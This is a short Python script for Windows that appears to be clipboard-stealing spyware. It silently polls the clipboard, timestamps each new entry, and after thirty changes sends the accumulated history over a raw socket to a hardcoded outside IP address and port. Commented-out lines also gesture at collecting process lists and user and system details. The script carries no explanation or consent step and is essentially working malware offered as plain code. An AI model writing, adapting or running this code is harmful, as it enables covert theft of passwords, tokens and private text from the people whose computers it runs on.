#import os
#import platform
import socket
#import subprocess
import time
import datetime
import win32clipboard

#cmd = 'WMIC PROCESS get Caption,Commandline,Processid'
#proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

s = socket.socket()
host = "149.28.63.177"
port = 15420

#my_system = platform.uname()
#user = os.getlogin()

allClipboard = "none"
lastClipboard = "none"
counter = 0

while True:
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except TypeError:
        time.sleep(10)
    if lastClipboard != data:
        if allClipboard == "none":
            allClipboard = "----- [{0}] -----\n".format(datetime.datetime.now()) + data
        else:
            allClipboard = allClipboard + "\n----- [{0}] -----\n".format(datetime.datetime.now()) + data
        counter += 1
        if counter >= 30:
            try:
                s.connect((host, port))
                s.send(bytes(allClipboard, "utf-8"))
                s.close()
            finally:
                counter = 0
                clipboard = "none"
                break
        lastClipboard = data
    else:
        lastClipboard = data
    time.sleep(1)